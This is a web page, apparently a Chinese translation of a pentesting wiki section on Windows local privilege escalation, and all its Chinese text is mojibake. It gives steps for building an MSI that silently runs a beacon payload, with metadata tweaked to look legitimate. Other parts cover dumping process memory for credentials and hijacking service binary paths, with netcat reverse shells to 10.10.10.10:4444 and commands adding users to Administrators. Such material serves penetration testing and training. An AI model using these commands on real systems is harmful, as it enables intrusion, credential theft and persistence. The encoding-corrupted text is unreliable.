<h3 id="ä½¿ç”¨-wix-åˆ›å»º-msi"><a class="header" href="#ä½¿ç”¨-wix-åˆ›å»º-msi">ä½¿ç”¨ WIX åˆ›å»º MSI</a></h3>
<p>{% content-ref url="create-msi-with-wix.md" %}
<a href="create-msi-with-wix.html">create-msi-with-wix.md</a>
{% endcontent-ref %}</p>
<h3 id="ä½¿ç”¨-visual-studio-åˆ›å»º-msi"><a class="header" href="#ä½¿ç”¨-visual-studio-åˆ›å»º-msi">ä½¿ç”¨ Visual Studio åˆ›å»º MSI</a></h3>
<ul>
<li><strong>ä½¿ç”¨</strong> Cobalt Strike æˆ– Metasploit ç”Ÿæˆä¸€ä¸ª <strong>æ–°çš„ Windows EXE TCP è´Ÿè½½</strong> åœ¨ <code>C:\privesc\beacon.exe</code></li>
<li>æ‰“å¼€ <strong>Visual Studio</strong>ï¼Œé€‰æ‹© <strong>åˆ›å»ºæ–°é¡¹ç›®</strong>ï¼Œåœ¨æœç´¢æ¡†ä¸­è¾“å…¥ "installer"ã€‚é€‰æ‹© <strong>Setup Wizard</strong> é¡¹ç›®å¹¶ç‚¹å‡» <strong>ä¸‹ä¸€æ­¥</strong>ã€‚</li>
<li>ç»™é¡¹ç›®å‘½åï¼Œä¾‹å¦‚ <strong>AlwaysPrivesc</strong>ï¼Œä½¿ç”¨ <strong><code>C:\privesc</code></strong> ä½œä¸ºä½ç½®ï¼Œé€‰æ‹© <strong>å°†è§£å†³æ–¹æ¡ˆå’Œé¡¹ç›®æ”¾åœ¨åŒä¸€ç›®å½•</strong>ï¼Œç„¶åç‚¹å‡» <strong>åˆ›å»º</strong>ã€‚</li>
<li>ä¸€ç›´ç‚¹å‡» <strong>ä¸‹ä¸€æ­¥</strong>ï¼Œç›´åˆ°åˆ°è¾¾ç¬¬ 3 æ­¥ï¼ˆé€‰æ‹©è¦åŒ…å«çš„æ–‡ä»¶ï¼‰ã€‚ç‚¹å‡» <strong>æ·»åŠ </strong> å¹¶é€‰æ‹©æ‚¨åˆšç”Ÿæˆçš„ Beacon è´Ÿè½½ã€‚ç„¶åç‚¹å‡» <strong>å®Œæˆ</strong>ã€‚</li>
<li>åœ¨ <strong>è§£å†³æ–¹æ¡ˆèµ„æºç®¡ç†å™¨</strong> ä¸­é«˜äº® <strong>AlwaysPrivesc</strong> é¡¹ç›®ï¼Œåœ¨ <strong>å±æ€§</strong> ä¸­ï¼Œå°† <strong>TargetPlatform</strong> ä» <strong>x86</strong> æ›´æ”¹ä¸º <strong>x64</strong>ã€‚</li>
<li>æ‚¨å¯ä»¥æ›´æ”¹å…¶ä»–å±æ€§ï¼Œä¾‹å¦‚ <strong>ä½œè€…</strong> å’Œ <strong>åˆ¶é€ å•†</strong>ï¼Œè¿™å¯ä»¥ä½¿å®‰è£…çš„åº”ç”¨çœ‹èµ·æ¥æ›´åˆæ³•ã€‚</li>
<li>å³é”®å•å‡»é¡¹ç›®ï¼Œé€‰æ‹© <strong>æŸ¥çœ‹ &gt; è‡ªå®šä¹‰æ“ä½œ</strong>ã€‚</li>
<li>å³é”®å•å‡» <strong>å®‰è£…</strong>ï¼Œé€‰æ‹© <strong>æ·»åŠ è‡ªå®šä¹‰æ“ä½œ</strong>ã€‚</li>
<li>åŒå‡» <strong>åº”ç”¨ç¨‹åºæ–‡ä»¶å¤¹</strong>ï¼Œé€‰æ‹©æ‚¨çš„ <strong>beacon.exe</strong> æ–‡ä»¶å¹¶ç‚¹å‡» <strong>ç¡®å®š</strong>ã€‚è¿™å°†ç¡®ä¿åœ¨è¿è¡Œå®‰è£…ç¨‹åºæ—¶ç«‹å³æ‰§è¡Œ beacon è´Ÿè½½ã€‚</li>
<li>åœ¨ <strong>è‡ªå®šä¹‰æ“ä½œå±æ€§</strong> ä¸‹ï¼Œå°† <strong>Run64Bit</strong> æ›´æ”¹ä¸º <strong>True</strong>ã€‚</li>
<li>æœ€åï¼Œ<strong>æ„å»ºå®ƒ</strong>ã€‚</li>
<li>å¦‚æœæ˜¾ç¤ºè­¦å‘Š <code>File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'</code>ï¼Œè¯·ç¡®ä¿å°†å¹³å°è®¾ç½®ä¸º x64ã€‚</li>
</ul>
<h3 id="msi-å®‰è£…"><a class="header" href="#msi-å®‰è£…">MSI å®‰è£…</a></h3>
<p>è¦åœ¨ <strong>åå°</strong> æ‰§è¡Œæ¶æ„ <code>.msi</code> æ–‡ä»¶çš„ <strong>å®‰è£…</strong>ï¼š</p>
<pre><code>msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
</code></pre>
<p>è¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š <em>exploit/windows/local/always_install_elevated</em></p>
<h2 id="é˜²ç—…æ¯’è½¯ä»¶å’Œæ£€æµ‹å™¨"><a class="header" href="#é˜²ç—…æ¯’è½¯ä»¶å’Œæ£€æµ‹å™¨">é˜²ç—…æ¯’è½¯ä»¶å’Œæ£€æµ‹å™¨</a></h2>
<h3 id="å®¡è®¡è®¾ç½®"><a class="header" href="#å®¡è®¡è®¾ç½®">å®¡è®¡è®¾ç½®</a></h3>
<p>è¿™äº›è®¾ç½®å†³å®šäº†ä»€ä¹ˆè¢«<strong>è®°å½•</strong>ï¼Œå› æ­¤æ‚¨åº”è¯¥æ³¨æ„</p>
<pre><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
</code></pre>
<h3 id="wef"><a class="header" href="#wef">WEF</a></h3>
<p>Windowsäº‹ä»¶è½¬å‘ï¼Œäº†è§£æ—¥å¿—å‘é€åˆ°å“ªé‡Œæ˜¯å¾ˆæœ‰è¶£çš„</p>
<pre><code class="language-bash">reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
</code></pre>
<h3 id="laps"><a class="header" href="#laps">LAPS</a></h3>
<p><strong>LAPS</strong> æ—¨åœ¨ <strong>ç®¡ç†æœ¬åœ°ç®¡ç†å‘˜å¯†ç </strong>ï¼Œç¡®ä¿æ¯ä¸ªå¯†ç éƒ½æ˜¯ <strong>å”¯ä¸€çš„ã€éšæœºç”Ÿæˆçš„ï¼Œå¹¶å®šæœŸæ›´æ–°</strong> åœ¨åŠ å…¥åŸŸçš„è®¡ç®—æœºä¸Šã€‚è¿™äº›å¯†ç å®‰å…¨åœ°å­˜å‚¨åœ¨ Active Directory ä¸­ï¼Œåªæœ‰é€šè¿‡ ACL æˆäºˆè¶³å¤Ÿæƒé™çš„ç”¨æˆ·æ‰èƒ½è®¿é—®ï¼Œä»è€Œå…è®¸ä»–ä»¬åœ¨è·å¾—æˆæƒçš„æƒ…å†µä¸‹æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚</p>
<p>{% content-ref url="../active-directory-methodology/laps.md" %}
<a href="../active-directory-methodology/laps.html">laps.md</a>
{% endcontent-ref %}</p>
<h3 id="wdigest"><a class="header" href="#wdigest">WDigest</a></h3>
<p>å¦‚æœå¯ç”¨ï¼Œ<strong>æ˜æ–‡å¯†ç å­˜å‚¨åœ¨ LSASS</strong>ï¼ˆæœ¬åœ°å®‰å…¨æˆæƒå­ç³»ç»ŸæœåŠ¡ï¼‰ã€‚<br />
<a href="../stealing-credentials/credentials-protections.html#wdigest"><strong>å…³äº WDigest çš„æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹æ­¤é¡µé¢</strong></a>.</p>
<pre><code class="language-bash">reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
</code></pre>
<h3 id="lsa-ä¿æŠ¤"><a class="header" href="#lsa-ä¿æŠ¤">LSA ä¿æŠ¤</a></h3>
<p>ä» <strong>Windows 8.1</strong> å¼€å§‹ï¼Œå¾®è½¯å¼•å…¥äº†å¢å¼ºçš„æœ¬åœ°å®‰å…¨æœºæ„ (LSA) ä¿æŠ¤ï¼Œä»¥ <strong>é˜»æ­¢</strong> ä¸å—ä¿¡ä»»çš„è¿›ç¨‹ <strong>è¯»å–å…¶å†…å­˜</strong> æˆ–æ³¨å…¥ä»£ç ï¼Œä»è€Œè¿›ä¸€æ­¥ä¿æŠ¤ç³»ç»Ÿã€‚<br />
<a href="../stealing-credentials/credentials-protections.html#lsa-protection"><strong>å…³äº LSA ä¿æŠ¤çš„æ›´å¤šä¿¡æ¯</strong></a>ã€‚</p>
<pre><code class="language-bash">reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
</code></pre>
<h3 id="credentials-guard"><a class="header" href="#credentials-guard">Credentials Guard</a></h3>
<p><strong>Credential Guard</strong> æ˜¯åœ¨ <strong>Windows 10</strong> ä¸­å¼•å…¥çš„ã€‚å®ƒçš„ç›®çš„æ˜¯ä¿æŠ¤å­˜å‚¨åœ¨è®¾å¤‡ä¸Šçš„å‡­æ®ï¼Œé˜²æ­¢åƒ pass-the-hash æ”»å‡»è¿™æ ·çš„å¨èƒã€‚| <a href="../stealing-credentials/credentials-protections.html#credential-guard"><strong>å…³äº Credentials Guard çš„æ›´å¤šä¿¡æ¯ã€‚</strong></a></p>
<pre><code class="language-bash">reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
</code></pre>
<h3 id="ç¼“å­˜å‡­æ®"><a class="header" href="#ç¼“å­˜å‡­æ®">ç¼“å­˜å‡­æ®</a></h3>
<p><strong>åŸŸå‡­æ®</strong>ç”±<strong>æœ¬åœ°å®‰å…¨æœºæ„</strong>ï¼ˆLSAï¼‰è¿›è¡Œè®¤è¯ï¼Œå¹¶è¢«æ“ä½œç³»ç»Ÿç»„ä»¶ä½¿ç”¨ã€‚å½“ç”¨æˆ·çš„ç™»å½•æ•°æ®é€šè¿‡æ³¨å†Œçš„å®‰å…¨åŒ…è¿›è¡Œè®¤è¯æ—¶ï¼Œé€šå¸¸ä¼šä¸ºè¯¥ç”¨æˆ·å»ºç«‹åŸŸå‡­æ®ã€‚<br />
<a href="../stealing-credentials/credentials-protections.html#cached-credentials"><strong>å…³äºç¼“å­˜å‡­æ®çš„æ›´å¤šä¿¡æ¯åœ¨è¿™é‡Œ</strong></a>ã€‚</p>
<pre><code class="language-bash">reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
</code></pre>
<h2 id="ç”¨æˆ·ä¸ç»„"><a class="header" href="#ç”¨æˆ·ä¸ç»„">ç”¨æˆ·ä¸ç»„</a></h2>
<h3 id="æšä¸¾ç”¨æˆ·ä¸ç»„"><a class="header" href="#æšä¸¾ç”¨æˆ·ä¸ç»„">æšä¸¾ç”¨æˆ·ä¸ç»„</a></h3>
<p>æ‚¨åº”è¯¥æ£€æŸ¥æ‚¨æ‰€å±çš„ä»»ä½•ç»„æ˜¯å¦å…·æœ‰æœ‰è¶£çš„æƒé™</p>
<pre><code class="language-bash"># CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
</code></pre>
<h3 id="ç‰¹æƒç»„"><a class="header" href="#ç‰¹æƒç»„">ç‰¹æƒç»„</a></h3>
<p>å¦‚æœä½ <strong>å±äºæŸä¸ªç‰¹æƒç»„ï¼Œä½ å¯èƒ½èƒ½å¤Ÿæå‡æƒé™</strong>ã€‚åœ¨è¿™é‡Œäº†è§£ç‰¹æƒç»„ä»¥åŠå¦‚ä½•æ»¥ç”¨å®ƒä»¬ä»¥æå‡æƒé™ï¼š</p>
<p>{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
<a href="../active-directory-methodology/privileged-groups-and-token-privileges.html">privileged-groups-and-token-privileges.md</a>
{% endcontent-ref %}</p>
<h3 id="ä»¤ç‰Œæ“ä½œ"><a class="header" href="#ä»¤ç‰Œæ“ä½œ">ä»¤ç‰Œæ“ä½œ</a></h3>
<p><strong>äº†è§£æ›´å¤š</strong>å…³äº<strong>ä»¤ç‰Œ</strong>çš„ä¿¡æ¯ï¼Œè¯·è®¿é—®æ­¤é¡µé¢ï¼š<a href="../authentication-credentials-uac-and-efs/#access-tokens"><strong>Windows Tokens</strong></a>ã€‚<br />
æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥<strong>äº†è§£æœ‰è¶£çš„ä»¤ç‰Œ</strong>åŠå…¶æ»¥ç”¨æ–¹æ³•ï¼š</p>
<p>{% content-ref url="privilege-escalation-abusing-tokens.md" %}
<a href="privilege-escalation-abusing-tokens.html">privilege-escalation-abusing-tokens.md</a>
{% endcontent-ref %}</p>
<h3 id="ç™»å½•ç”¨æˆ·--ä¼šè¯"><a class="header" href="#ç™»å½•ç”¨æˆ·--ä¼šè¯">ç™»å½•ç”¨æˆ· / ä¼šè¯</a></h3>
<pre><code class="language-bash">qwinsta
klist sessions
</code></pre>
<h3 id="å®¶åº­æ–‡ä»¶å¤¹"><a class="header" href="#å®¶åº­æ–‡ä»¶å¤¹">å®¶åº­æ–‡ä»¶å¤¹</a></h3>
<pre><code class="language-powershell">dir C:\Users
Get-ChildItem C:\Users
</code></pre>
<h3 id="å¯†ç ç­–ç•¥"><a class="header" href="#å¯†ç ç­–ç•¥">å¯†ç ç­–ç•¥</a></h3>
<pre><code class="language-bash">net accounts
</code></pre>
<h3 id="è·å–å‰ªè´´æ¿çš„å†…å®¹"><a class="header" href="#è·å–å‰ªè´´æ¿çš„å†…å®¹">è·å–å‰ªè´´æ¿çš„å†…å®¹</a></h3>
<pre><code class="language-bash">powershell -command "Get-Clipboard"
</code></pre>
<h2 id="è¿è¡Œè¿›ç¨‹"><a class="header" href="#è¿è¡Œè¿›ç¨‹">è¿è¡Œè¿›ç¨‹</a></h2>
<h3 id="æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æƒé™"><a class="header" href="#æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æƒé™">æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æƒé™</a></h3>
<p>é¦–å…ˆï¼Œåˆ—å‡ºè¿›ç¨‹ <strong>æ£€æŸ¥è¿›ç¨‹å‘½ä»¤è¡Œä¸­çš„å¯†ç </strong>ã€‚<br />
æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥ <strong>è¦†ç›–æŸä¸ªæ­£åœ¨è¿è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶</strong>ï¼Œæˆ–è€…æ‚¨æ˜¯å¦å…·æœ‰äºŒè¿›åˆ¶æ–‡ä»¶å¤¹çš„å†™å…¥æƒé™ï¼Œä»¥åˆ©ç”¨å¯èƒ½çš„ <a href="dll-hijacking/"><strong>DLL åŠ«æŒæ”»å‡»</strong></a>:</p>
<pre><code class="language-bash">Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
</code></pre>
<p>å§‹ç»ˆæ£€æŸ¥å¯èƒ½æ­£åœ¨è¿è¡Œçš„ <a href="../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html"><strong>electron/cef/chromium è°ƒè¯•å™¨</strong>ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨å®ƒæ¥æå‡æƒé™</a>ã€‚</p>
<p><strong>æ£€æŸ¥è¿›ç¨‹äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒé™</strong></p>
<pre><code class="language-bash">for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2&gt;nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" &amp;&amp; echo.
)
)
</code></pre>
<p><strong>æ£€æŸ¥è¿›ç¨‹äºŒè¿›åˆ¶æ–‡ä»¶æ–‡ä»¶å¤¹çš„æƒé™ (</strong><a href="dll-hijacking/"><strong>DLL Hijacking</strong></a><strong>)</strong></p>
<pre><code class="language-bash">for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2&gt;nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" &amp;&amp; echo.
)
</code></pre>
<h3 id="å†…å­˜å¯†ç æŒ–æ˜"><a class="header" href="#å†…å­˜å¯†ç æŒ–æ˜">å†…å­˜å¯†ç æŒ–æ˜</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨æ¥è‡ª sysinternals çš„ <strong>procdump</strong> åˆ›å»ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„å†…å­˜è½¬å‚¨ã€‚åƒ FTP è¿™æ ·çš„æœåŠ¡åœ¨å†…å­˜ä¸­ä»¥ <strong>æ˜æ–‡å½¢å¼å­˜å‚¨å‡­æ®</strong>ï¼Œå°è¯•è½¬å‚¨å†…å­˜å¹¶è¯»å–å‡­æ®ã€‚</p>
<pre><code class="language-bash">procdump.exe -accepteula -ma &lt;proc_name_tasklist&gt;
</code></pre>
<h3 id="ä¸å®‰å…¨çš„-gui-åº”ç”¨ç¨‹åº"><a class="header" href="#ä¸å®‰å…¨çš„-gui-åº”ç”¨ç¨‹åº">ä¸å®‰å…¨çš„ GUI åº”ç”¨ç¨‹åº</a></h3>
<p><strong>ä»¥ SYSTEM èº«ä»½è¿è¡Œçš„åº”ç”¨ç¨‹åºå¯èƒ½å…è®¸ç”¨æˆ·ç”Ÿæˆ CMD æˆ–æµè§ˆç›®å½•ã€‚</strong></p>
<p>ç¤ºä¾‹ï¼šâ€œWindows å¸®åŠ©å’Œæ”¯æŒâ€ï¼ˆWindows + F1ï¼‰ï¼Œæœç´¢â€œå‘½ä»¤æç¤ºç¬¦â€ï¼Œç‚¹å‡»â€œç‚¹å‡»æ‰“å¼€å‘½ä»¤æç¤ºç¬¦â€</p>
<h2 id="æœåŠ¡"><a class="header" href="#æœåŠ¡">æœåŠ¡</a></h2>
<p>è·å–æœåŠ¡åˆ—è¡¨ï¼š</p>
<pre><code class="language-bash">net start
wmic service list brief
sc query
Get-Service
</code></pre>
<h3 id="æƒé™"><a class="header" href="#æƒé™">æƒé™</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <strong>sc</strong> è·å–æœåŠ¡çš„ä¿¡æ¯</p>
<pre><code class="language-bash">sc qc &lt;service_name&gt;
</code></pre>
<p>å»ºè®®ä½¿ç”¨æ¥è‡ª <em>Sysinternals</em> çš„äºŒè¿›åˆ¶æ–‡ä»¶ <strong>accesschk</strong> æ¥æ£€æŸ¥æ¯ä¸ªæœåŠ¡æ‰€éœ€çš„æƒé™çº§åˆ«ã€‚</p>
<pre><code class="language-bash">accesschk.exe -ucqv &lt;Service_Name&gt; #Check rights for different groups
</code></pre>
<p>å»ºè®®æ£€æŸ¥â€œç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·â€æ˜¯å¦å¯ä»¥ä¿®æ”¹ä»»ä½•æœåŠ¡ï¼š</p>
<pre><code class="language-bash">accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2&gt;nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
</code></pre>
<p><a href="https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe">æ‚¨å¯ä»¥åœ¨æ­¤å¤„ä¸‹è½½é€‚ç”¨äºXPçš„accesschk.exe</a></p>
<h3 id="å¯ç”¨æœåŠ¡"><a class="header" href="#å¯ç”¨æœåŠ¡">å¯ç”¨æœåŠ¡</a></h3>
<p>å¦‚æœæ‚¨é‡åˆ°æ­¤é”™è¯¯ï¼ˆä¾‹å¦‚ä¸SSDPSRVï¼‰ï¼š</p>
<p><em>ç³»ç»Ÿé”™è¯¯ 1058 å·²å‘ç”Ÿã€‚</em><br />
&amp;#xNAN;<em>Tè¯¥æœåŠ¡æ— æ³•å¯åŠ¨ï¼Œå¯èƒ½æ˜¯å› ä¸ºå®ƒè¢«ç¦ç”¨æˆ–æ²¡æœ‰ä¸ä¹‹å…³è”çš„å¯ç”¨è®¾å¤‡ã€‚</em></p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å¯ç”¨å®ƒï¼š</p>
<pre><code class="language-bash">sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
</code></pre>
<p><strong>è¯·æ³¨æ„ï¼ŒæœåŠ¡ upnphost ä¾èµ–äº SSDPSRV æ‰èƒ½å·¥ä½œï¼ˆé€‚ç”¨äº XP SP1ï¼‰</strong></p>
<p><strong>æ­¤é—®é¢˜çš„å¦ä¸€ç§è§£å†³æ–¹æ³•</strong>æ˜¯è¿è¡Œï¼š</p>
<pre><code>sc.exe config usosvc start= auto
</code></pre>
<h3 id="ä¿®æ”¹æœåŠ¡äºŒè¿›åˆ¶è·¯å¾„"><a class="header" href="#ä¿®æ”¹æœåŠ¡äºŒè¿›åˆ¶è·¯å¾„"><strong>ä¿®æ”¹æœåŠ¡äºŒè¿›åˆ¶è·¯å¾„</strong></a></h3>
<p>åœ¨â€œç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·â€ç»„æ‹¥æœ‰ <strong>SERVICE_ALL_ACCESS</strong> æƒé™çš„æœåŠ¡åœºæ™¯ä¸­ï¼Œå¯ä»¥ä¿®æ”¹æœåŠ¡çš„å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¦ä¿®æ”¹å¹¶æ‰§è¡Œ <strong>sc</strong>ï¼š</p>
<pre><code class="language-bash">sc config &lt;Service_Name&gt; binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config &lt;Service_Name&gt; binpath= "net localgroup administrators username /add"
sc config &lt;Service_Name&gt; binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
</code></pre>
<h3 id="é‡å¯æœåŠ¡"><a class="header" href="#é‡å¯æœåŠ¡">é‡å¯æœåŠ¡</a></h3>
<pre><code class="language-bash">wmic service NAMEOFSERVICE call startservice
net stop [service name] &amp;&amp; net start [service name]
</code></pre>
<p>æƒé™å¯ä»¥é€šè¿‡å„ç§æƒé™æå‡ï¼š</p>
<ul>
<li><strong>SERVICE_CHANGE_CONFIG</strong>: å…è®¸é‡æ–°é…ç½®æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li>
<li><strong>WRITE_DAC</strong>: å¯ç”¨æƒé™é‡æ–°é…ç½®ï¼Œä»è€Œèƒ½å¤Ÿæ›´æ”¹æœåŠ¡é…ç½®ã€‚</li>
<li><strong>WRITE_OWNER</strong>: å…è®¸è·å–æ‰€æœ‰æƒå’Œæƒé™é‡æ–°é…ç½®ã€‚</li>
<li><strong>GENERIC_WRITE</strong>: ç»§æ‰¿æ›´æ”¹æœåŠ¡é…ç½®çš„èƒ½åŠ›ã€‚</li>
<li><strong>GENERIC_ALL</strong>: ä¹Ÿç»§æ‰¿æ›´æ”¹æœåŠ¡é…ç½®çš„èƒ½åŠ›ã€‚</li>
</ul>
<p>ä¸ºäº†æ£€æµ‹å’Œåˆ©ç”¨æ­¤æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨ <em>exploit/windows/local/service_permissions</em>ã€‚</p>
<h3 id="æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶çš„å¼±æƒé™"><a class="header" href="#æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶çš„å¼±æƒé™">æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶çš„å¼±æƒé™</a></h3>
<p><strong>æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥ä¿®æ”¹ç”±æœåŠ¡æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶</strong>ï¼Œæˆ–è€…æ‚¨æ˜¯å¦åœ¨<strong>äºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸Šå…·æœ‰å†™æƒé™</strong>ï¼ˆ<a href="dll-hijacking/"><strong>DLL Hijacking</strong></a>ï¼‰<strong>ã€‚</strong><br />
æ‚¨å¯ä»¥ä½¿ç”¨ <strong>wmic</strong>ï¼ˆä¸åœ¨ system32 ä¸­ï¼‰è·å–ç”±æœåŠ¡æ‰§è¡Œçš„æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ <strong>icacls</strong> æ£€æŸ¥æ‚¨çš„æƒé™ï¼š</p>
<pre><code class="language-bash">for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2&gt;nul | findstr "(M) (F) :\"
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <strong>sc</strong> å’Œ <strong>icacls</strong>ï¼š</p>
<pre><code class="language-bash">sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i &gt;&gt; C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; C:\Temp\path.txt
</code></pre>
<h3 id="æœåŠ¡æ³¨å†Œè¡¨ä¿®æ”¹æƒé™"><a class="header" href="#æœåŠ¡æ³¨å†Œè¡¨ä¿®æ”¹æƒé™">æœåŠ¡æ³¨å†Œè¡¨ä¿®æ”¹æƒé™</a></h3>
<p>æ‚¨åº”è¯¥æ£€æŸ¥æ˜¯å¦å¯ä»¥ä¿®æ”¹ä»»ä½•æœåŠ¡æ³¨å†Œè¡¨ã€‚<br />
æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼<strong>æ£€æŸ¥</strong>æ‚¨å¯¹æœåŠ¡<strong>æ³¨å†Œè¡¨</strong>çš„<strong>æƒé™</strong>ï¼š</p>
<pre><code class="language-bash">reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2&gt;nul &amp; reg save %a %temp%\reg.hiv 2&gt;nul &amp;&amp; reg restore %a %temp%\reg.hiv 2&gt;nul &amp;&amp; echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "&lt;Username&gt; Users Path Everyone"
</code></pre>
<p>åº”è¯¥æ£€æŸ¥<strong>Authenticated Users</strong>æˆ–<strong>NT AUTHORITY\INTERACTIVE</strong>æ˜¯å¦æ‹¥æœ‰<code>FullControl</code>æƒé™ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼ŒæœåŠ¡æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶å¯ä»¥è¢«æ›´æ”¹ã€‚</p>
<p>è¦æ›´æ”¹æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„ï¼š</p>
<pre><code class="language-bash">reg add HKLM\SYSTEM\CurrentControlSet\services\&lt;service_name&gt; /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
</code></pre>
<h3 id="æœåŠ¡æ³¨å†Œè¡¨-appenddataaddsubdirectory-æƒé™"><a class="header" href="#æœåŠ¡æ³¨å†Œè¡¨-appenddataaddsubdirectory-æƒé™">æœåŠ¡æ³¨å†Œè¡¨ AppendData/AddSubdirectory æƒé™</a></h3>
<p>å¦‚æœæ‚¨å¯¹æ³¨å†Œè¡¨æ‹¥æœ‰æ­¤æƒé™ï¼Œè¿™æ„å‘³ç€<strong>æ‚¨å¯ä»¥ä»æ­¤æ³¨å†Œè¡¨åˆ›å»ºå­æ³¨å†Œè¡¨</strong>ã€‚åœ¨ Windows æœåŠ¡çš„æƒ…å†µä¸‹ï¼Œè¿™<strong>è¶³ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼š</strong></p>
<p>{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
<a href="appenddata-addsubdirectory-permission-over-service-registry.html">appenddata-addsubdirectory-permission-over-service-registry.md</a>
{% endcontent-ref %}</p>
<h3 id="æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„"><a class="header" href="#æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„">æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„</a></h3>
